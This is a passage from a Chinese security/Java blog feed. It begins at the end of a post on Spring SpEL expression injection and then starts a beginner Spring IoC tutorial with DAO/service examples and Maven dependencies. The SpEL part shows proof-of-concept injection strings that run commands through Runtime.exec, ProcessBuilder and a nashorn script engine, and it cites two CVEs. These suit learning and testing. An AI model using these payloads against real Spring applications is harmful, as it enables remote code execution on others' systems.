class="title class_">ExpressionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">        <span class="type">EvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        expression.getValue(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨getValueè§¦å‘è¡¨è¾¾å¼çš„æ‰§è¡Œ</p><p>ç”šè‡³å¯ä»¥ç›´æ¥newå¯¹è±¡ï¼š</p><ul><li>ProcessBuilderï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>ScriptEngineManager</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure><p>spring cloud gateway SpELè¡¨è¾¾å¼æ³¨å…¥CVE-2022-22947ï¼š</p><p><a href="https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/">https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/</a></p><p>jackson SpELæ³¨å…¥CVE-2017-17485</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springä¸€æ–‡å…¥é—¨</title>
      <link href="/2024/10/13/spring-yi-wen-ru-men-zhuan-zai/"/>
      <url>/2024/10/13/spring-yi-wen-ru-men-zhuan-zai/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>è½¬è½½è‡ª<a href="https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#">https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#</a></p><h2 id="1-ä»€ä¹ˆæ˜¯Spring"><a href="#1-ä»€ä¹ˆæ˜¯Spring" class="headerlink" title="1.ä»€ä¹ˆæ˜¯Spring"></a>1.ä»€ä¹ˆæ˜¯Spring</h2><p>ä»–æ˜¯ä¸€ä¸ªè®¾è®¡å±‚é¢çš„æ¡†æ¶ï¼Œæå¤§çš„ç®€åŒ–äº†å¼€å‘â€”javaç¨‹åºå‘˜çš„æ˜¥å¤©</p><p>ç„¶åäº†è§£å…¶æ ¸å¿ƒæ˜¯<strong>æ§åˆ¶åè½¬ï¼ˆIOCï¼‰</strong>å’Œé¢å‘åˆ‡é¢<strong>ï¼ˆAOPï¼‰</strong>ï¼Œæ¢ä¸€å¥è¯è¯´ Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„<strong>æ§åˆ¶åè½¬</strong>ï¼ˆIOCï¼‰ï¼Œå’Œé¢å‘åˆ‡é¢ç¼–ç¨‹çš„ï¼ˆAOPï¼‰çš„æ¡†æ¶</p><h2 id="2-IOCç†è®ºæ¨å¯¼"><a href="#2-IOCç†è®ºæ¨å¯¼" class="headerlink" title="2.IOCç†è®ºæ¨å¯¼"></a>2.IOCç†è®ºæ¨å¯¼</h2><p>IoCå…¨ç§°Inversion of Control,ä¸­æ–‡ç¿»è¯‘æ§åˆ¶åè½¬ï¼Œè¿™é‡Œçš„åè½¬æ˜¯æŒ‡ç¨‹åºä¸»è¦æ§åˆ¶æƒæ˜¯è°çš„æ‰‹é‡Œ</p><p>ä¹‹å‰çš„ä¸šåŠ¡å®ç°å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯é ç¨‹åºå‘˜ä¸€ç‚¹ä¸€ç‚¹å †ä¸Šå»çš„ï¼Œç”¨æˆ·æƒ³è¦ä»€ä¹ˆï¼Œç¨‹åºå‘˜å°±å¤šå†™ä¸€ç‚¹éœ€æ±‚ï¼Œç„¶åä¸€ä¸€å¯¹åº”ï¼Œå¾ˆæ˜¯ç¬¨é‡ã€‚</p><p>è€ŒIOCå°±æ˜¯è¦æŠŠæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æƒ³è¦è°ƒå•¥ï¼Œæˆ‘ä»¬ç¨‹åºèƒ½å¤ŸæŒ‡å®šå»å¹²å•¥ï¼Œè¿™å°±æ˜¯æ§åˆ¶åè½¬ã€‚</p><p>çœ‹ä¸‹é¢ä»£ç ä¾‹å­ï¼š</p><p>UserMapperæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserMapperå®ç°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserMapperImpl</span> <span class="keyword">implements</span> <span class="title class_">UserMapper</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é»˜è®¤è·å–ç”¨æˆ·æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserServiceæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Services;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserServiceå®ç°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Services;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    UserMapper userMapper=<span class="keyword">new</span> <span class="title class_">UserMapperImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userMapper.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“é€»è¾‘å°±æ˜¯æŒ‰ç…§ä¸€èˆ¬ä¸šåŠ¡æ¥ï¼ŒDao å±‚æŠŠåŠŸèƒ½å†™å¥½ï¼Œç„¶åç”¨æˆ·æƒ³è¦æŸ¥è¯¢çš„æ—¶å€™ç”± Service å±‚å»è°ƒç”¨ Dao å±‚å¯¹åº”çš„åŠŸèƒ½é€»è¾‘â€”-å®ä¾‹åŒ– UserMapperImplï¼Œç„¶åè°ƒå®ƒçš„æ–¹æ³•</p><p>è¿™ä¸€æ•´æ®µçš„é€»è¾‘æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼šç¨‹åºæ˜¯å†™æ­»çš„ï¼Œç”¨æˆ·æ­¤æ—¶åªèƒ½è°ƒè¿™ä¸€ä¸ªåŠŸèƒ½ï¼Œå‡å¦‚è¯´æˆ‘ä»¬çš„ Dao å±‚å¤šäº†å¦‚ä¸‹çš„ä»£ç ï¼š<br><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171105651.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171105651.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserMysqlMapperImpl</span> <span class="keyword">implements</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨è°ƒç”¨Mysqlæ•°æ®åº“çš„æ•°æ®&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserOracleMapperImpl</span> <span class="keyword">implements</span> <span class="title class_">UserMapper</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨è°ƒOracleæ•°æ®åº“çš„æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç”¨æˆ·æƒ³è¦å…·ä½“çš„è°ƒå– Oracle æ•°æ®åº“çš„æ•°æ®æˆ–è€… Mysql æ•°æ®åº“æ—¶ï¼ŒService å±‚çš„ä»£ç å°±å¿…é¡»å¤§æ”¹</p><p>æ¯”å¦‚è¯´ç”¨æˆ·æƒ³è¦è°ƒ Mysql æ—¶ï¼Œservice å±‚ä»£ç å¿…é¡»è¿™ä¹ˆå†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Services;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    UserMapper userMapper=<span class="keyword">new</span> <span class="title class_">UserMysqlMapperImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userMapper.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨æˆ·æƒ³è¦è°ƒç”¨ Oracle ï¼Œservice å±‚ä»£ç å°±å¿…é¡»è¿™ä¹ˆå†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Services;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    UserMapper userMapper=<span class="keyword">new</span> <span class="title class_">UserOracleMapperImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userMapper.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ service å±‚å¿…é¡»å®ä¾‹åŒ–ä¸¤ä¸ªä¸åŒçš„ UserMapperImplï¼Œä½ å¯èƒ½ä¼šè¯´é‚£å°±å¤šå»ºå‡ ä¸ª Service å¤„ç†çš„ç±»ï¼Œä½†æ˜¯å¦‚æœé¡¹ç›®æœ‰å¾ˆå¤šè¿™æ ·çš„æ“ä½œï¼Œé‚£å°±æ˜¯é‡å¤æ€§çš„å·¥ä½œå†—ä½™</p><p>æ‰€ä»¥æˆ‘ä»¬å°†æ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ï¼Œä»–æƒ³æ€ä¹ˆåŠï¼Œç¨‹åºå°±è·Ÿç€å˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Dao.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserMapper</span><span class="params">(UserMapper userMapper)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userMapper = userMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userMapper.getUser();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæµ‹è¯•ç±»ï¼ˆå®é™…è°ƒç”¨çš„åœ°æ–¹ï¼‰å°±å¯ä»¥è¿™ä¹ˆå†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Dao.UserMysqlMapperImpl;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Services.UserService;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Services.UserServiceImpl;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetUser</span><span class="params">()</span>&#123;</span><br><span class="line">        UserServiceImpl userService=<span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line">        userService.setUserMapper(<span class="keyword">new</span> <span class="title class_">UserMysqlMapperImpl</span>());</span><br><span class="line">        userService.getUser();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ set æ–¹æ³•ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿè‡ªå®šä¹‰ä»–æƒ³ç”¨çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬åªéœ€è¦å†™å¥½å­˜åœ¨çš„æ–¹æ³•å’Œé€»è¾‘å³å¯ï¼ˆæ¢ä¸€ç§è¯´æ³•â€“å·æ‡’ï¼Ÿï¼‰</p><p>IOC çš„æ€æƒ³ä½¿å¾—ç¨‹åºå‘˜ä¸ç”¨å»ç®¡ç†å¯¹è±¡çš„åˆ›å»ºï¼Œç³»ç»Ÿè€¦åˆæ€§é™ä½ï¼Œå¯ä»¥æ›´åŠ ä¸“æ³¨çš„åœ¨ä¸šåŠ¡çš„å®ç°ä¸Š</p><p>å½“ç„¶ä¸Šé¢çš„å†…å®¹ä»…ä»…åªæ˜¯ IOC çš„åŸå‹ï¼Œå¾ˆåŸå§‹ï¼Œå¹¶ä¸æ˜¯æœ€ç»ˆå½¢æ€ï¼Œè¿˜æœ‰å¾ˆå¤šé—®é¢˜æ²¡æœ‰å»è§£å†³</p><p>è¿™é‡Œå†è§£é‡Šä¸€ä¸‹è€¦åˆæ€§çš„é—®é¢˜ï¼Œè€¦åˆæ„æ€å°±æ˜¯æ¯ä¸ªç±»æˆ–å®ä½“ä¹‹é—´çš„è¿æ¥ï¼Œå¹¶ä¸”äº’ç›¸å½±å“ï¼Œå¯¼è‡´ä¸€ä¸ªå‡ºé—®é¢˜ï¼Œå…¶ä»–å°±å¾—è·Ÿç€å‡ºé—®é¢˜ï¼Œè¿™å…¶å®å¯¹äºä¸€ä¸ªå¤§å‹é¡¹ç›®æ¥è¯´æ˜¯å¾ˆè‡´å‘½çš„ï¼Œ<strong>è§£è€¦</strong>è¿™ä¸€ä¸ªæ–¹é¢ï¼Œå°±è¢«æŠ¬åˆ°äº†å¾ˆé«˜çš„ä½ç½®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171131081.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013171131081.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£ä¹ˆå¦‚ä½•è§£è€¦ï¼Œä»¥åŠæˆ‘ä»¬æ‰€è¯´çš„ IOC æ€æƒ³é™ä½ç³»ç»Ÿè€¦åˆæ€§çš„ç›´è§‚ä½“ç°ï¼Œå¯çœ‹ä¸Šé¢è¿™å¼ å›¾</p><p>ç»å…¸çš„ IOC è¿œè¿œä¸æ­¢æˆ‘ä»¬ä¸Šé¢å°å®éªŒçš„å†…å®¹ï¼Œæˆ‘ä»¬åé¢çš„å­¦ä¹ å†…å®¹ä¹Ÿæ˜¯å»é…ç½® Spring çš„ IOCï¼Œç„¶åä½¿ç”¨å’Œä½“æ‚Ÿ IOCï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ï¼Œè¿›å…¥ Hello-Spring ç¯èŠ‚</p><h2 id="3-Hello-Spring"><a href="#3-Hello-Spring" class="headerlink" title="3.Hello-Spring"></a>3.Hello-Spring</h2><h3 id="0x01-ç¯å¢ƒé…ç½®"><a href="#0x01-ç¯å¢ƒé…ç½®" class="headerlink" title="0x01 ç¯å¢ƒé…ç½®"></a>0x01 ç¯å¢ƒé…ç½®</h3><p>æˆ‘ä¸ªäººçš„ maven é…ç½®çš„ä¾èµ–å…¨éƒ¨å¦‚ä¸‹ï¼Œé‡‡ç”¨çš„æ˜¯ boogipop å¸ˆå‚…çš„é…ç½®ï¼Œæ³¨æ„æ¡ä»¶ï¼š<strong>JDK17 åŠä»¥ä¸Š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- junit --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åšå®Œé…ç½®ï¼Œæ–°å»ºé¡¹ç›®ï¼Œæ•´ç†ç»“æ„</p><p>ç„¶åå°±æ˜¯å†™ Spring çš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶å†è®²çš„å…·ä½“ä¸€ç‚¹å°±æ˜¯ bean çš„é…ç½®æ–‡ä»¶</p><p>å½“ç„¶åœ¨å†™ bean é…ç½®æ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—å†™ä¸€ä¸ª bean å‡ºæ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;str=&#x27;&quot;</span> + str + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStr</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span 